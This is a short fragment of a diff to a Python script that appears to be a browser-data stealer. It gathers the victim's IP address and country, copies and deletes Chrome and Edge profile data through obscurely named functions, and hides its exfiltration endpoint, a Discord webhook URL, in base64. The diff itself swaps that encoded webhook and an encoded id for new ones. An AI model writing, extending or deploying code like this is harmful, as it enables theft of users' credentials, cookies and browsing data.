@@ -21,7 +21,7 @@ country_code = ip_country['country']
 
 newtime = str(now.hour) + "h" +str(now.minute)+"m"+str(now.second)+"s"+str(now.day)+"-"+str(now.month)+"-"+str(now.year)
 name_f = country_code +" "+ ip +"-"+newtime
-crypt = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTExODU1NzU3NzU4MDY1NDcxMi9YNTlRUkhaSkwzMkNKbEJ0ckJUTkFJNTNRVFk4bkUwcXd5VDF1Tmo5a3dVdnFxZmdqX0pkd0tCSnUzcmxEZmhqWjMzTw==").decode('utf-8')
+crypt = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTExOTY4ODIwMjQ0NjQ0MjU0OC9GRmdPY3NEQzFYdjFTdUJaNGo1WFFHZ3VXUU9Ga012clp4MXU0T1JkV0hUT0J6OHVNRUJkcU1keGFHUUV5RzNGNUNVUA==").decode('utf-8')
 def check_chrome_running():
     for proc in os.popen('tasklist').readlines():
         if 'chrome.exe' in proc:
@@ -53,7 +53,7 @@ def gx0c(data_path,chrome_path):
         try:
             copy_file();delete_file(os.path.join(data_chrome,"profile"+str(i)))  
         except:print("")  
-fud = base64.b64decode("MTExODU1NzU0NzgwOTQ4NDgzNA==").decode('utf-8')
+fud = base64.b64decode("MTExOTY4ODE3MTQyNTM2NjE4OQ==").decode('utf-8')
 def gx0e(data_path,edge_path):
     data_edge = os.path.join(data_path, "Edge");os.mkdir(data_edge)
     profiles = find_profile(edge_path)
